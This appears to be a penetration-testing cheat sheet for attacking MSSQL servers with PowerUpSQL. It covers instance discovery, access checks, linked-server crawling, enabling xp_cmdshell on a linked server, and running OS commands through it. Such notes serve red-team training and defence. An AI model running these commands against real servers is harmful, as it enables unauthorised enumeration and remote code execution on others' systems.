# MSSQL Servers

## Tool

{% embed url="https://github.com/NetSPI/PowerUpSQL" %}

```text
Import-Module .\PowerupSQL.psd1
```

## Commands

#### **Discovery \(SPN Scanning\)**

```text
Get-SQLInstanceDomain
```

#### **Discover Local SQL Server Instances**

```text
Get-SQLInstanceLocal -Verbose
```

#### **Discover Remote SQL Server Instances**

```text
Get-SQLInstanceBroadcast -Verbose
Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1
```

#### **Check Accessibility**

```text
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

#### **Gather Information**

```text
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

#### **Look for links to remote servers**

```text
Get-SQLServerLink -Instance db-mssql -Verbose
```

#### **Enumerating Database Links**

```text
Get-SQLServerLinkCrawl -Instance db-mssql -Verbose
```

#### Executing commands

* On the target server, either xp\_cmdshell should be already enabled
* If rpcout is enabled \(disabled by default\), xp\_cmdshell can be enabled using: 

```text
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
```

Now, we can run custom query

```text
Get-SQLServerLinkCrawl -Instance db-mssql -Query "exec master..xp_cmdshell 'whoami'"
```



